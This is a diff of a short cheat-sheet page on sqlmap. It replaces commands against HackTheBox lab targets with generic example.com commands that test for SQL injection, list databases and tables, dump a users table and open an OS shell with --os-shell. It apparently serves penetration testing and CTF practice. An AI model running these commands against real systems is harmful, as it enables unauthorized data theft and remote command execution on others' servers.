@@ -7,18 +7,23 @@ tags:
 ---
 # sqlmap
 
-Automate SQL injection
+Automatically test SQL injection
 
 ## Capabilities
 
 ```bash
-sqlmap --cookie "nagiosxi=nb0sdl2lug4h4aevb5kr2slpqs" -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data "action=acknowledge_banner_message&id=3" --batch
+# Test a GET request
+sqlmap -u 'https://example.com?vulnerable_parameter=a' --batch
+sqlmap -u 'https://example.com?vulnerable_parameter=a' --batch --dbs
+sqlmap -u 'https://example.com?vulnerable_parameter=a' -D example_database --tables
+sqlmap -u 'https://example.com?vulnerable_parameter=a' -D example_database -T example_users --dump
 
-sqlmap --cookie "nagiosxi=nb0sdl2lug4h4aevb5kr2slpqs" -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data "action=acknowledge_banner_message&id=3" --batch --dbs
+# Test a POST request with cookie
+sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" --batch
+sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" --batch --dbs
+sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" -D example_database --tables
+sqlmap --cookie "key=value" -u 'https://example.com' --method=POST --data "safe_parameter=safe_value&vulerable_parameter=a" -D example_database -T example_users --dump
 
-sqlmap --cookie 'nagiosxi=0lc2bm9f8v560og7b2favnmoif' -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data 'action=acknowledge banner message&id=3' -D nagiosxi --tables
-
-sqlmap --cookie 'nagiosxi=0lc2bm9f8v560og7b2favnmoif' -u 'https://nagios.monitored.htb/nagiosxi/admin/banner_message-ajaxhelper.php' --method=POST --data 'action=acknowledge banner message&id=3' -D nagiosxi -T xi_users --dump
-
-sqlmap -u 'http://127.0.0.1/pandora_console/include/chart_generator.php?session_id=test' --os-shell
+# Attempt to pop a shell
+sqlmap -u 'https://example.com?vulnerable_parameter=a' --os-shell
 ```
